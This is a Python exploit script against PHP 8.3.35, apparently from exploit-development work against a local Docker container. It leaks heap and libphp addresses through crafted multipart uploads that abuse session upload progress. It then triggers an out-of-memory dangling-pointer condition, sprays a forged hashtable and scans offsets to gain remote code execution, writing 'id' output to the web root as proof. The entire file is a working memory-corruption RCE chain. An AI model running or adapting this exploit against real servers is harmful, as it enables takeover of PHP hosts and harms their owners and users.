#!/usr/bin/env python3
"""8.3.35: our stage1+2 leaks + 9bie B2 spray, scanning S offset.

S = chunk_base + offset.  8.4.26 uses 0xF8398.  Scan a window around it
and a wider range to find the 8.3.35 value.
"""
import subprocess, sys, os, time, struct, socket, re, urllib.parse
from collections import Counter

PORT = 18112
CONTAINER = "p2s8335"
DTOR_OFFSET = 0x49ec50
ZIF_OFFSET = 0x3ac080
CMD = "id>/www/p1"
FETCH = "/p1"
GH = r"C:\Users\likat\.qwen\tmp\p2s"
HERE = os.path.dirname(os.path.abspath(__file__))
TMP = os.path.join(HERE, "tmp_8335")

def log(m): print(m, flush=True)

def send_raw(port, body, timeout=60, path="/"):
    boundary = b"C" * 10
    req = (f"POST {path} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n"
           f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
    resp = bytearray()
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(req + body)
        while len(resp) < (16 << 20):
            c = s.recv(65536)
            if not c: break
            resp.extend(c)
    except (OSError, ConnectionError): pass
    finally:
        try: s.close()
        except: pass
    return bytes(resp)

def build_multipart(parts, boundary):
    out = bytearray()
    for p in parts:
        name = p["name"].encode() if isinstance(p["name"], str) else p["name"]
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename"):
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)

def rotate(port):
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V"*3000} for i in range(1001)]
    parts += [{"name":"PHPSESSID","data":b"\x00"},
              {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
              {"name":"f","filename":"a.txt","data":b"A"*64},
              {"name":"big","data":b"B"*(256*1024*1024)}]
    send_raw(port, build_multipart(parts, b"S"*17), timeout=120)
    time.sleep(0.4)
    parts2 = [{"name":"PHPSESSID","data":b"attacksessionid0001"},
              {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
    send_raw(port, build_multipart(parts2, b"BNDRY12345"), timeout=30)
    time.sleep(0.5)

def stage1(port):
    parts = [{"name":f"p{i:04d}","data":b"x"} for i in range(1001)]
    parts += [{"name":"PHPSESSID","data":b"\x00"},
              {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
              {"name":"f","filename":"a.txt","data":b"A"*64},
              {"name":"big","data":b"B"*(256*1024*1024)}]
    send_raw(port, build_multipart(parts, b"S"*17), timeout=120)
    time.sleep(0.2)
    parts = [{"name":"PHPSESSID","data":b"attacksessionid0001"},
             {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
    for i in range(841):
        val = (f"v{i:04d}"+"x"*44)[:48]
        parts.append({"name":str(1000+i),"data":val.encode()})
    forge = bytearray(b"A"*79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name":"1999","data":bytes(forge)})
    resp = send_raw(port, build_multipart(parts, b"B"*10), timeout=60)
    return parse_chunk_base(resp)

def stage2(port):
    parts = [{"name":f"f{i:04d}"[:5],"data":b"x"*39} for i in range(1001)]
    parts += [{"name":"PHPSESSID","data":b"\x00"},
              {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
              {"name":"f","filename":"a.txt","data":b"A"*64},
              {"name":"big","data":b"B"*(256*1024*1024)}]
    send_raw(port, build_multipart(parts, b"S"*17), timeout=120)
    time.sleep(0.2)
    parts = [{"name":"PHPSESSID","data":b"attacksessionid0001"},
             {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
    for i in range(983):
        cnt = 16 if i == 406 else 1
        for j in range(cnt):
            parts.append({"name":f"a{i:04d}[{j}]","data":b"x"*16})
    resp = send_raw(port, build_multipart(parts, b"B"*10), timeout=60)
    return parse_libphp_base(resp, DTOR_OFFSET)

def parse_chunk_base(resp):
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m: return 0
    raw = urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))
    if len(raw) < 1000: return 0
    c = Counter()
    for i in range(len(raw)-8):
        v = int.from_bytes(raw[i:i+8],"little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c: return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0

def parse_libphp_base(resp, dtor):
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m: return 0
    raw = urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))
    if len(raw) < 16: return 0
    p = int.from_bytes(raw[8:16],"little")
    if not (0x7F0000000000 <= p < 0x800000000000): return 0
    if p & 0xFFF != dtor & 0xFFF: return 0
    base = p - dtor
    return base if base & 0xFFF == 0 else 0

def get_proof(port):
    req = f"GET {FETCH} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nConnection: close\r\n\r\n".encode()
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=10)
        s.settimeout(10)
        s.sendall(req)
        data = b""
        while True:
            c = s.recv(65536)
            if not c: break
            data += c
        s.close()
        head, _, body = data.partition(b"\r\n\r\n")
        m2 = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m2.group(1)) if m2 else 0), body
    except: return 0, b""

def run_9bie(script, args, timeout=120):
    cmd = [sys.executable, os.path.join(GH, f"gh_pure_{script}")] + args
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    return r.returncode == 0, (r.stdout or "") + (r.stderr or "")

def try_s_offset(port, chunk, libphp, s_offset):
    S = chunk + s_offset
    zif = libphp + ZIF_OFFSET
    ht_file = os.path.join(TMP, "ht_scan.bin")
    ok, out = run_9bie("mk_ht.py", [hex(S), hex(zif), CMD, ht_file], timeout=30)
    if not ok:
        return False
    # A2: cheap OOM to make PS(http_session_vars) dangling
    ok, out = run_9bie("cheap_oom_a.py",
        ["--port", str(PORT), "--parts", "880", "--depth", "64", "--fillers", "115"],
        timeout=120)
    time.sleep(0.3)
    # B2: spray
    ok, out = run_9bie("fake_ref_b.py",
        ["--port", str(PORT), "--vl", "384", "--n1", "500", "--n2", "495",
         "--rc", "1", "--ht-addr", hex(S), "--ht-file", ht_file],
        timeout=120)
    time.sleep(0.8)
    status, body = get_proof(port)
    if status == 200 and b"uid=" in body:
        return True
    return False

def main():
    os.makedirs(TMP, exist_ok=True)
    log(f"[*] 8.3.35 S-offset scan")
    
    # Get leaks once (fresh worker)
    subprocess.run(["docker","restart",CONTAINER], capture_output=True, timeout=30)
    time.sleep(2)
    rotate(PORT)
    chunk = stage1(PORT)
    if not chunk: log("[-] stage1 failed"); return 1
    log(f"[+] chunk=0x{chunk:x}")
    rotate(PORT)
    libphp = stage2(PORT)
    if not libphp: log("[-] stage2 failed"); return 1
    log(f"[+] libphp=0x{libphp:x}")
    
    # Scan S offsets: around 0xF8398 (8.4.26 value) and wider
    offsets = [0xF8398]
    # nearby
    for d in range(-0x1000, 0x1001, 0x1000):
        offsets.append(0xF8398 + d)
    # wider: 0x40000 - 0x120000
    for o in range(0x40000, 0x120001, 0x8000):
        if o not in offsets:
            offsets.append(o)
    offsets.sort()
    
    for i, off in enumerate(offsets):
        # fresh worker per attempt
        rotate(PORT)
        ok = try_s_offset(PORT, chunk, libphp, off)
        status = "HIT" if ok else "miss"
        log(f"  [{i:3d}] S_off=0x{off:05x} -> {status}")
        if ok:
            log(f"[+] RCE! S_offset=0x{off:x}")
            status, body = get_proof(PORT)
            log(f"[+] proof: {body.decode('latin1').strip()}")
            return 0
        # check container alive
        try:
            s = socket.create_connection(("127.0.0.1", PORT), timeout=3)
            s.close()
        except:
            log("  [!] container down, restarting")
            subprocess.run(["docker","restart",CONTAINER], capture_output=True, timeout=30)
            time.sleep(2)
            rotate(PORT)
            # re-leak
            chunk = stage1(PORT)
            if not chunk: log("[-] stage1 re-fail"); return 1
            rotate(PORT)
            libphp = stage2(PORT)
            if not libphp: log("[-] stage2 re-fail"); return 1
            log(f"  [+] re-leak chunk=0x{chunk:x} libphp=0x{libphp:x}")
    
    log("[-] scan exhausted, no hit")
    return 1

if __name__ == "__main__":
    sys.exit(main())
